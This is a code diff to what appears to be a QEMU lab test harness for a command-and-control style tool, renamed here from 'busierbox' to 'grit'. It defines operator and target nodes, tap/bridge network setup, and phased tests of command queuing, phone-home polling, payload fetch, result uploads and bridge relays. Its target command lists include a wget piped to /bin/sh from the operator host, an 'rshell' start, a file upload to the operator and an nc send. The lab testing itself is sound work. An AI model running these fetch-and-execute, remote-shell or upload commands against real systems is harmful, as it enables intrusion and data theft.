@@ -88,7 +88,7 @@ run_dir.mkdir(parents=True, exist_ok=True)
 
 kernel_path = str(Path(root) / str(env.get("kernel_path") or ""))
 rootfs_path = str(Path(root) / str(env.get("rootfs_path") or ""))
-busierbox_path = str(Path(root) / str(env.get("busierbox_path") or ""))
+grit_path = str(Path(root) / str(env.get("grit_path") or ""))
 qemu_append = (str(env.get("append_args") or "") + " init=/bin/sh").strip()
 service_ports = {
     "command_queue": 22205,
@@ -203,7 +203,7 @@ phase_evidence_checks = {
         {"artifact": "offline-workflow-drain-tui.json", "path": "target.mailbox_delivered_command_count", "expect": 2},
     ],
     "systemd-user-service": [
-        {"artifact": "systemd-user-service.json", "path": "unit_name", "expect": "busierbox-flaky.service"},
+        {"artifact": "systemd-user-service.json", "path": "unit_name", "expect": "grit-flaky.service"},
         {"artifact": "systemd-user-service.json", "path": "commands[*].returncode", "expect_all": 0},
     ],
     "short-phone-home-window": [
@@ -415,20 +415,20 @@ topology = {
     "environment_paths": {
         "kernel": kernel_path,
         "rootfs": rootfs_path,
-        "busierbox": busierbox_path,
+        "grit": grit_path,
     },
     "kernel_init_command_line": qemu_append,
     "service_ports": service_ports,
     "operator_node": {
         "name": "operator",
-        "role": "busierbox-server",
+        "role": "grit-server",
         "host_forward_ports": service_ports,
         "network_mode": "host-side control plane with per-target controllable links",
     },
     "target_nodes": [
-        {"name": "target-alpha", "role": "polling-target", "mailbox": "target-alpha", "kernel": kernel_path, "rootfs": rootfs_path, "busierbox": busierbox_path, "init_command_line": qemu_append},
-        {"name": "target-bravo", "role": "polling-target", "mailbox": "target-bravo", "kernel": kernel_path, "rootfs": rootfs_path, "busierbox": busierbox_path, "init_command_line": qemu_append},
-        {"name": "target-workflow", "role": "polling-target", "mailbox": "target-workflow", "kernel": kernel_path, "rootfs": rootfs_path, "busierbox": busierbox_path, "init_command_line": qemu_append},
+        {"name": "target-alpha", "role": "polling-target", "mailbox": "target-alpha", "kernel": kernel_path, "rootfs": rootfs_path, "grit": grit_path, "init_command_line": qemu_append},
+        {"name": "target-bravo", "role": "polling-target", "mailbox": "target-bravo", "kernel": kernel_path, "rootfs": rootfs_path, "grit": grit_path, "init_command_line": qemu_append},
+        {"name": "target-workflow", "role": "polling-target", "mailbox": "target-workflow", "kernel": kernel_path, "rootfs": rootfs_path, "grit": grit_path, "init_command_line": qemu_append},
     ],
     "networks": [
         {"name": "operator-lan", "kind": "tap-or-user", "purpose": "operator services"},
@@ -454,37 +454,37 @@ topology = {
         {"phase": "return-offline", "target-alpha-link": "down", "target-bravo-link": "down", "bridge-path": "down"},
     ],
     "host_network_setup": {
-        "bridge": "bbx-qemu-br0",
-        "operator_tap": "bbx-op-tap0",
+        "bridge": "grit-qemu-br0",
+        "operator_tap": "grit-op-tap0",
         "target_taps": {
-            "target-alpha": "bbx-alpha-tap0",
-            "target-bravo": "bbx-bravo-tap0",
-            "target-workflow": "bbx-workflow-tap0",
+            "target-alpha": "grit-alpha-tap0",
+            "target-bravo": "grit-bravo-tap0",
+            "target-workflow": "grit-workflow-tap0",
         },
         "setup_commands": [
-            "ip link add bbx-qemu-br0 type bridge",
-            "ip tuntap add bbx-op-tap0 mode tap user $(id -un)",
-            "ip tuntap add bbx-alpha-tap0 mode tap user $(id -un)",
-            "ip tuntap add bbx-bravo-tap0 mode tap user $(id -un)",
-            "ip tuntap add bbx-workflow-tap0 mode tap user $(id -un)",
-            "ip link set bbx-op-tap0 master bbx-qemu-br0",
-            "ip link set bbx-alpha-tap0 master bbx-qemu-br0",
-            "ip link set bbx-bravo-tap0 master bbx-qemu-br0",
-            "ip link set bbx-workflow-tap0 master bbx-qemu-br0",
-            "ip link set bbx-qemu-br0 up",
+            "ip link add grit-qemu-br0 type bridge",
+            "ip tuntap add grit-op-tap0 mode tap user $(id -un)",
+            "ip tuntap add grit-alpha-tap0 mode tap user $(id -un)",
+            "ip tuntap add grit-bravo-tap0 mode tap user $(id -un)",
+            "ip tuntap add grit-workflow-tap0 mode tap user $(id -un)",
+            "ip link set grit-op-tap0 master grit-qemu-br0",
+            "ip link set grit-alpha-tap0 master grit-qemu-br0",
+            "ip link set grit-bravo-tap0 master grit-qemu-br0",
+            "ip link set grit-workflow-tap0 master grit-qemu-br0",
+            "ip link set grit-qemu-br0 up",
         ],
         "link_control_commands": {
-            "target-alpha-link-down": "ip link set bbx-alpha-tap0 down",
-            "target-alpha-link-up": "ip link set bbx-alpha-tap0 up",
-            "target-bravo-link-down": "ip link set bbx-bravo-tap0 down",
-            "target-bravo-link-up": "ip link set bbx-bravo-tap0 up",
-            "target-workflow-link-down": "ip link set bbx-workflow-tap0 down",
-            "target-workflow-link-up": "ip link set bbx-workflow-tap0 up",
-            "bridge-path-down": "ip link set bbx-op-tap0 down",
-            "bridge-path-up": "ip link set bbx-op-tap0 up",
+            "target-alpha-link-down": "ip link set grit-alpha-tap0 down",
+            "target-alpha-link-up": "ip link set grit-alpha-tap0 up",
+            "target-bravo-link-down": "ip link set grit-bravo-tap0 down",
+            "target-bravo-link-up": "ip link set grit-bravo-tap0 up",
+            "target-workflow-link-down": "ip link set grit-workflow-tap0 down",
+            "target-workflow-link-up": "ip link set grit-workflow-tap0 up",
+            "bridge-path-down": "ip link set grit-op-tap0 down",
+            "bridge-path-up": "ip link set grit-op-tap0 up",
         },
         "cleanup_commands": [
-            "ip link del bbx-qemu-br0",
+            "ip link del grit-qemu-br0",
         ],
     },
     "accelerated_timing": {
@@ -509,15 +509,15 @@ base_qemu = [
     "-no-reboot",
 ]
 qemu_command_templates = {
-    "target-alpha": base_qemu + ["-netdev", "tap,id=target-alpha,ifname=bbx-alpha-tap0,script=no,downscript=no", "-device", "virtio-net-pci,netdev=target-alpha"],
-    "target-bravo": base_qemu + ["-netdev", "tap,id=target-bravo,ifname=bbx-bravo-tap0,script=no,downscript=no", "-device", "virtio-net-pci,netdev=target-bravo"],
-    "target-workflow": base_qemu + ["-netdev", "tap,id=target-workflow,ifname=bbx-workflow-tap0,script=no,downscript=no", "-device", "virtio-net-pci,netdev=target-workflow"],
+    "target-alpha": base_qemu + ["-netdev", "tap,id=target-alpha,ifname=grit-alpha-tap0,script=no,downscript=no", "-device", "virtio-net-pci,netdev=target-alpha"],
+    "target-bravo": base_qemu + ["-netdev", "tap,id=target-bravo,ifname=grit-bravo-tap0,script=no,downscript=no", "-device", "virtio-net-pci,netdev=target-bravo"],
+    "target-workflow": base_qemu + ["-netdev", "tap,id=target-workflow,ifname=grit-workflow-tap0,script=no,downscript=no", "-device", "virtio-net-pci,netdev=target-workflow"],
 }
 
 qemu_binary = str(env.get("qemu_binary") or "")
 qemu_binary_path = shutil.which(qemu_binary) if qemu_binary else ""
 path_requirements = {}
-for key in ("kernel_path", "rootfs_path", "busierbox_path"):
+for key in ("kernel_path", "rootfs_path", "grit_path"):
     rel = str(env.get(key) or "")
     path = Path(root) / rel if rel else Path("")
     path_requirements[key] = {
@@ -561,74 +561,74 @@ for key, rec in path_requirements.items():
 
 phase_operator_commands = {
     "offline-queue": [
-        "scripts/busierbox-server --daemon --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
-        "scripts/busierbox-server --target-id target-alpha --queue-command 'busierbox survey --json'",
-        "scripts/busierbox-server --target-id target-bravo --queue-command 'busierbox survey --json'",
-        "scripts/busierbox-server --line-tui",
-        "scripts/busierbox-server --json-status > offline-status.json",
+        "scripts/grit-server --daemon --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
+        "scripts/grit-server --target-id target-alpha --queue-command 'grit survey --json'",
+        "scripts/grit-server --target-id target-bravo --queue-command 'grit survey --json'",
+        "scripts/grit-server --line-tui",
+        "scripts/grit-server --json-status > offline-status.json",
     ],
     "offline-workflow-drain": [
-        "scripts/busierbox-server --target-id target-workflow --run-target-workflow-action queue-survey-bootstrap",
-        "scripts/busierbox-server --target-id target-workflow --run-target-workflow-action stage-file-fetch --target-workflow-local-file ./payload.bin --target-workflow-request-name payload.bin",
-        "scripts/busierbox-server --target-id target-workflow --json-status > offline-workflow-drain-status.json",
-        "scripts/busierbox-server --line-tui --target-id target-workflow",
+        "scripts/grit-server --target-id target-workflow --run-target-workflow-action queue-survey-bootstrap",
+        "scripts/grit-server --target-id target-workflow --run-target-workflow-action stage-file-fetch --target-workflow-local-file ./payload.bin --target-workflow-request-name payload.bin",
+        "scripts/grit-server --target-id target-workflow --json-status > offline-workflow-drain-status.json",
+        "scripts/grit-server --line-tui --target-id target-workflow",
     ],
     "systemd-user-service": [
-        "scripts/busierbox-server --systemd-user-action print --systemd-user-dry-run --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
-        "scripts/busierbox-server --systemd-user-action status --systemd-user-dry-run",
+        "scripts/grit-server --systemd-user-action print --systemd-user-dry-run --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
+        "scripts/grit-server --systemd-user-action status --systemd-user-dry-run",
     ],
     "short-phone-home-window": [
         "./host-network-setup.sh link target-alpha-link-up",
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-alpha-poll.json",
+        "scripts/grit-server --target-id target-alpha --json-status > after-alpha-poll.json",
     ],
     "duplicate-poll": [
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-duplicate-alpha-poll.json",
+        "scripts/grit-server --target-id target-alpha --json-status > after-duplicate-alpha-poll.json",
     ],
     "dropped-result-upload": [
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-dropped-alpha-result.json",
+        "scripts/grit-server --target-id target-alpha --json-status > after-dropped-alpha-result.json",
     ],
     "malformed-result-upload": [
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-malformed-alpha-result.json",
+        "scripts/grit-server --target-id target-alpha --json-status > after-malformed-alpha-result.json",
     ],
     "result-upload": [
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-alpha-result.json",
+        "scripts/grit-server --target-id target-alpha --json-status > after-alpha-result.json",
     ],
     "multi-target-isolation": [
-        "scripts/busierbox-server --target-id target-alpha --json-status > multi-target-isolation.json",
-        "scripts/busierbox-server --target-id target-bravo --list-command-queue",
+        "scripts/grit-server --target-id target-alpha --json-status > multi-target-isolation.json",
+        "scripts/grit-server --target-id target-bravo --list-command-queue",
     ],
     "target-mismatch-phone-home": [
-        "scripts/busierbox-server --target-id target-alpha --json-status > target-mismatch-phone-home.json",
+        "scripts/grit-server --target-id target-alpha --json-status > target-mismatch-phone-home.json",
     ],
     "survey-window": [
-        "scripts/busierbox-server --survey-bootstrap --survey-bootstrap-port 22207 --one-shot",
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-survey-result.json",
+        "scripts/grit-server --survey-bootstrap --survey-bootstrap-port 22207 --one-shot",
+        "scripts/grit-server --target-id target-alpha --json-status > after-survey-result.json",
     ],
     "partial-transfer": [
-        "scripts/busierbox-server --file-service --file-service-port 22204 --one-shot",
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-partial-upload.json",
+        "scripts/grit-server --file-service --file-service-port 22204 --one-shot",
+        "scripts/grit-server --target-id target-alpha --json-status > after-partial-upload.json",
     ],
     "bridge-interruption": [
-        "scripts/busierbox-server --save-bridge-profile flaky-bad-bridge --bridge-port 22206 --bridge-dest-host target-alpha --bridge-dest-port 80 --bridge-hop operator:22206=target-alpha:80",
-        "scripts/busierbox-server --bridge-profile flaky-bad-bridge --bridge",
-        "scripts/busierbox-server --target-id target-alpha --json-status > after-bridge-relay.json",
+        "scripts/grit-server --save-bridge-profile flaky-bad-bridge --bridge-port 22206 --bridge-dest-host target-alpha --bridge-dest-port 80 --bridge-hop operator:22206=target-alpha:80",
+        "scripts/grit-server --bridge-profile flaky-bad-bridge --bridge",
+        "scripts/grit-server --target-id target-alpha --json-status > after-bridge-relay.json",
     ],
     "return-offline": [
-        "scripts/busierbox-server --json-status > return-offline-status.json",
-        "scripts/busierbox-server --json-status > final-status.json",
+        "scripts/grit-server --json-status > return-offline-status.json",
+        "scripts/grit-server --json-status > final-status.json",
     ],
 }
 
 phase_target_commands = {
     "offline-workflow-drain": [
-        "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue once --target-id target-workflow",
-        "busierbox fetch payload.bin --host <operator-ip> --port 22204 --target-id target-workflow",
+        "GRIT_COMMAND_QUEUE_ENABLE=yes GRIT_COMMAND_QUEUE_TLS=no GRIT_OPERATOR_SERVER_HOST=<operator-ip> grit command-queue once --target-id target-workflow",
+        "grit fetch payload.bin --host <operator-ip> --port 22204 --target-id target-workflow",
     ],
     "short-phone-home-window": [
-        "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue once --target-id target-alpha",
+        "GRIT_COMMAND_QUEUE_ENABLE=yes GRIT_COMMAND_QUEUE_TLS=no GRIT_OPERATOR_SERVER_HOST=<operator-ip> grit command-queue once --target-id target-alpha",
     ],
     "duplicate-poll": [
-        "BB_COMMAND_QUEUE_ENABLE=yes BB_COMMAND_QUEUE_TLS=no BB_OPERATOR_SERVER_HOST=<operator-ip> busierbox command-queue once --target-id target-alpha",
+        "GRIT_COMMAND_QUEUE_ENABLE=yes GRIT_COMMAND_QUEUE_TLS=no GRIT_OPERATOR_SERVER_HOST=<operator-ip> grit command-queue once --target-id target-alpha",
     ],
     "dropped-result-upload": [
         "simulate dropped /command-queue/result upload by closing target link before Content-Length bytes are sent",
@@ -637,19 +637,19 @@ phase_target_commands = {
         "printf '{bad-json' | nc <operator-ip> 22205",
     ],
     "result-upload": [
-        "busierbox command-queue result --target-id target-alpha --result-json command-result.json",
+        "grit command-queue result --target-id target-alpha --result-json command-result.json",
     ],
     "target-mismatch-phone-home": [
-        "busierbox command-queue result --target-id target-bravo --result-json command-result.json",
+        "grit command-queue result --target-id target-bravo --result-json command-result.json",
     ],
     "survey-window": [
         "wget -O- http://<operator-ip>:22207/survey.sh | /bin/sh",
     ],
     "partial-transfer": [
-        "busierbox upload /tmp/evidence.txt --operator http://<operator-ip>:22204",
+        "grit upload /tmp/evidence.txt --operator http://<operator-ip>:22204",
     ],
     "bridge-interruption": [
-        "busierbox rshell start --target-id target-alpha",
+        "grit rshell start --target-id target-alpha",
     ],
 }
 
